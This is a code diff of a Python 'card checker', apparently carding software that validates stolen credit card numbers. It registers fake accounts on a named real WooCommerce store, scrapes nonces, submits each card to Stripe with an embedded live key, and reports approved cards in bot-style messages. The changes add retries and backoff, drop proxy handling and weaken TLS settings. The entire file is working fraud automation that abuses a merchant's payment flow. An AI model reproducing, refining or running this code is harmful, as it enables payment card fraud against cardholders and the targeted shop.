@@ -6,6 +6,8 @@ import string
 import os
 import logging
 from datetime import datetime
+import ssl
+import json
 
 # Configure logging
 logging.basicConfig(
@@ -18,15 +20,13 @@ class AdvancedCardChecker:
     def __init__(self):
         self.proxy_pool = []
         self.load_proxies()
-        self.request_timeout = aiohttp.ClientTimeout(total=70)
+        self.request_timeout = aiohttp.ClientTimeout(total=70)  # Increased timeout
         self.max_concurrent = 3
         self.stripe_key = "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"
         self.bin_cache = {}
         self.admin_username = "FNxElectra"
-        # Blacklist setup
         self.blacklist_file = 'blacklist.txt'
         self.blacklist = self.load_blacklist()
-        # Add specified BINs to blacklist
         self.blacklist.update(['559888', '415464'])
         self.save_blacklist()
 
@@ -36,28 +36,27 @@ class AdvancedCardChecker:
                 self.proxy_pool = [line.strip() for line in f if line.strip()]
 
     def load_blacklist(self):
-        """Load blacklisted BINs from file into a set."""
         if os.path.exists(self.blacklist_file):
             with open(self.blacklist_file, 'r') as f:
                 return set(line.strip() for line in f if line.strip())
-        return set()  # Return empty set if file doesn’t exist
+        return set()
 
     def save_blacklist(self):
-        """Save blacklisted BINs to file."""
         with open(self.blacklist_file, 'w') as f:
             for bin in sorted(self.blacklist):
                 f.write(bin + '\n')
 
-    async def fetch_nonce(self, session, url, pattern, proxy=None):
+    async def fetch_nonce(self, session, url, pattern):
         try:
-            async with session.get(url, proxy=proxy) as response:
+            async with session.get(url) as response:
                 html = await response.text()
                 match = re.search(pattern, html)
                 if match:
                     return match.group(1)
+                logger.info(f"No nonce found in {url}")
                 return None
         except Exception as e:
-            logger.error(f"Nonce fetch error: {str(e)}")
+            logger.error(f"Nonce fetch error for {url}: {str(e)}")
             return None
 
     def generate_random_account(self):
@@ -111,7 +110,7 @@ class AdvancedCardChecker:
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 
 [⌬]𝙏𝙄𝙈𝙀 -» <code>{check_time:.2f}s</code>
-<b>[⌬]𝐏𝐑𝐎𝐗𝐘 -» [ LIVE ✅ ]</b>
+<b>[⌬]𝐏𝐑𝐎𝐗𝐘 -» [ NONE ]</b>
 
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 
@@ -120,34 +119,69 @@ class AdvancedCardChecker:
 [み]𝗕𝗼𝘁 -» @FN_CHECKERR_BOT
 """
 
+    async def make_request(self, session, method, url, data=None, retries=3, backoff_factor=1):
+        """Helper function to make HTTP requests with retries and exponential backoff."""
+        for attempt in range(retries):
+            try:
+                if method == 'get':
+                    async with session.get(url) as response:
+                        return response, await response.text()
+                elif method == 'post':
+                    async with session.post(url, data=data) as response:
+                        return response, await response.text()
+            except aiohttp.ClientConnectionError as e:
+                if "APPLICATION_DATA_AFTER_CLOSE_NOTIFY" in str(e):
+                    logger.warning(f"SSL error on attempt {attempt+1}/{retries} for {url}: {e}")
+                if attempt < retries - 1:
+                    delay = backoff_factor * (2 ** attempt)
+                    logger.warning(f"Retrying {url} after {delay}s due to {e}")
+                    await asyncio.sleep(delay)
+                else:
+                    logger.error(f"Request failed for {url} after {retries} attempts: {e}")
+                    return None, None
+            except Exception as e:
+                logger.error(f"Unexpected error for {url}: {e}")
+                return None, None
+        return None, None
+
     async def process_line(self, user_id, combo, semaphore):
         start_time = datetime.now()
         async with semaphore:
             try:
                 # Validate combo format
                 if len(combo.split("|")) != 4:
+                    logger.info(f"Invalid combo format: {combo}")
                     return None
+                
                 # Extract BIN and check blacklist
                 cc = combo.split('|')[0]
                 bin_number = cc[:6]
                 if bin_number in self.blacklist:
                     logger.info(f"Skipping blacklisted BIN: {bin_number}")
                     return None
-                # Proceed with checking
-                proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
-                bin_info = await self.fetch_bin_info(bin_number)
                 
-                async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
-                    # Fetch nonce for registration
-                    nonce = await self.fetch_nonce(session, 
-                        'https://www.dragonworksperformance.com/my-account',
-                        r'name="woocommerce-register-nonce" value="(.*?)"',
-                        proxy=proxy
-                    )
-                    if not nonce:
-                        return None
+                # Create SSL context
+                ssl_context = ssl.create_default_context()
+                ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')  # Allow older ciphers if needed
+                ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2  # Enforce TLS 1.2 or higher
 
-                    # Register account
+                # Initialize aiohttp session with custom SSL context
+                async with aiohttp.ClientSession(timeout=self.request_timeout, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
+                    # Step 1: Fetch nonce for registration
+                    response, html = await self.make_request(
+                        session, 'get', 
+                        'https://www.dragonworksperformance.com/my-account'
+                    )
+                    if not response or response.status != 200:
+                        logger.info(f"Failed to fetch registration page: {response.status if response else 'No response'}")
+                        return None
+                    match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
+                    if not match:
+                        logger.info("Failed to fetch registration nonce")
+                        return None
+                    nonce = match.group(1)
+
+                    # Step 2: Register account
                     email = self.generate_random_account()
                     reg_data = {
                         "email": email,
@@ -155,24 +189,34 @@ class AdvancedCardChecker:
                         "_wp_http_referer": "/my-account/",
                         "register": "Register"
                     }
-                    async with session.post(
-                        'https://www.dragonworksperformance.com/my-account',
-                        data=reg_data,
-                        proxy=proxy
-                    ) as response:
-                        if response.status != 200:
-                            return None
-
-                    # Fetch payment nonce
-                    payment_nonce = await self.fetch_nonce(session,
-                        'https://www.dragonworksperformance.com/my-account/add-payment-method/',
-                        r'"createAndConfirmSetupIntentNonce":"(.*?)"',
-                        proxy=proxy
+                    response, _ = await self.make_request(
+                        session, 'post', 
+                        'https://www.dragonworksperformance.com/my-account', 
+                        data=reg_data
                     )
-                    if not payment_nonce:
+                    if not response or response.status != 200:
+                        logger.info(f"Failed to register account: {response.status if response else 'No response'}")
                         return None
+                    await asyncio.sleep(1)  # Avoid rate limits
 
-                    # Process with Stripe
+                    # Step 3: Fetch payment nonce
+                    response, html = await self.make_request(
+                        session, 'get', 
+                        'https://www.dragonworksperformance.com/my-account/add-payment-method/'
+                    )
+                    if not response or response.status != 200:
+                        logger.info(f"Failed to fetch payment page: {response.status if response else 'No response'}")
+                        return None
+                    match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
+                    if not match:
+                        logger.info("Failed to fetch payment nonce")
+                        return None
+                    payment_nonce = match.group(1)
+
+                    # Step 4: Fetch BIN info
+                    bin_info = await self.fetch_bin_info(bin_number)
+
+                    # Step 5: Process with Stripe
                     card_data = combo.split("|")
                     stripe_data = {
                         "type": "card",
@@ -184,45 +228,60 @@ class AdvancedCardChecker:
                         "billing_details[address][country]": "US",
                         "key": self.stripe_key
                     }
-                    async with session.post(
-                        'https://api.stripe.com/v1/payment_methods',
-                        data=stripe_data,
-                        proxy=proxy
-                    ) as stripe_res:
-                        stripe_json = await stripe_res.json()
-                        if 'id' not in stripe_json:
-                            return None
-                        payment_id = stripe_json['id']
+                    response, stripe_res = await self.make_request(
+                        session, 'post', 
+                        'https://api.stripe.com/v1/payment_methods', 
+                        data=stripe_data
+                    )
+                    if not response or response.status != 200:
+                        logger.info(f"Stripe payment method creation failed: {response.status if response else 'No response'}")
+                        return None
+                    try:
+                        stripe_json = json.loads(stripe_res)
+                    except json.JSONDecodeError:
+                        logger.error("Invalid JSON response from Stripe")
+                        return None
+                    if 'id' not in stripe_json:
+                        logger.info("Stripe payment method creation failed: No payment ID")
+                        return None
+                    payment_id = stripe_json['id']
 
-                    # Confirm payment
+                    # Step 6: Confirm payment
                     confirm_data = {
                         "action": "create_and_confirm_setup_intent",
                         "wc-stripe-payment-method": payment_id,
                         "_ajax_nonce": payment_nonce,
                     }
-                    async with session.post(
-                        'https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
-                        data=confirm_data,
-                        proxy=proxy
-                    ) as confirm_res:
-                        confirm_json = await confirm_res.json()
-                        if confirm_json.get("success", False) and confirm_json.get("data", {}).get("status", "") == "succeeded":
-                            check_time = (datetime.now() - start_time).total_seconds()
-                            return {
-                                'combo': combo,
-                                'message': await self.format_approval_message(combo, bin_info, check_time),
-                                'bin_info': bin_info,
-                                'check_time': check_time
-                            }
+                    response, confirm_res = await self.make_request(
+                        session, 'post', 
+                        'https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 
+                        data=confirm_data
+                    )
+                    if not response or response.status != 200:
+                        logger.info(f"Payment confirmation failed: {response.status if response else 'No response'}")
                         return None
+                    try:
+                        confirm_json = json.loads(confirm_res)
+                    except json.JSONDecodeError:
+                        logger.error("Invalid JSON response from payment confirmation")
+                        return None
+                    if confirm_json.get("success", False) and confirm_json.get("data", {}).get("status", "") == "succeeded":
+                        check_time = (datetime.now() - start_time).total_seconds()
+                        return {
+                            'combo': combo,
+                            'message': await self.format_approval_message(combo, bin_info, check_time),
+                            'bin_info': bin_info,
+                            'check_time': check_time
+                        }
+                    logger.info(f"Payment confirmation failed for {combo}: {confirm_json.get('data', {}).get('message', 'No message')}")
+                    return None
 
             except Exception as e:
-                logger.error(f"Processing error: {str(e)}")
+                logger.error(f"Error processing {combo}: {str(e)}")
                 return None
 
     async def check_card(self, combo):
-        """Check a single card and return result if approved."""
-        user_id = "fn_only_approved"  # Dummy user_id for standalone checks
+        user_id = "fn_only_approved"
         semaphore = asyncio.Semaphore(self.max_concurrent)
         result = await self.process_line(user_id, combo, semaphore)
         return result
